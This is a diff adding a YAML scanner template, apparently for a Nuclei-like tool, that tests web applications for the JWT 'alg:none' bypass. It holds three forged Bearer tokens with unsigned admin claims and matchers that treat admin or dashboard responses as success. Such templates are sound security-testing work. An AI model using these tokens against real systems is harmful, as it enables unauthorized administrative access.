@@ -1,0 +1,29 @@
+id: jwt-weaknesses
+info:
+  name: "JWT Algorithm Confusion"
+  severity: high
+  description: "Detects JWT weaknesses including alg:none bypass and key confusion"
+  tags: [auth, jwt, bypass, token]
+  author: Wired
+
+inject: headers
+detection: status_diff
+header_names:
+  - Authorization
+
+payloads:
+  # alg:none bypass (header.payload.empty-signature)
+  - "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFrZW1pIiwiaWF0IjoxNTE2MjM5MDIyLCJhZG1pbiI6dHJ1ZX0."
+  # alg:None variant
+  - "Bearer eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFrZW1pIiwiaWF0IjoxNTE2MjM5MDIyLCJhZG1pbiI6dHJ1ZX0."
+  # alg:NONE variant
+  - "Bearer eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFrZW1pIiwiaWF0IjoxNTE2MjM5MDIyLCJhZG1pbiI6dHJ1ZX0."
+
+matchers:
+  status_codes:
+    - 200
+    - 302
+  body_patterns:
+    - "(?i)admin"
+    - "(?i)welcome"
+    - "(?i)dashboard"
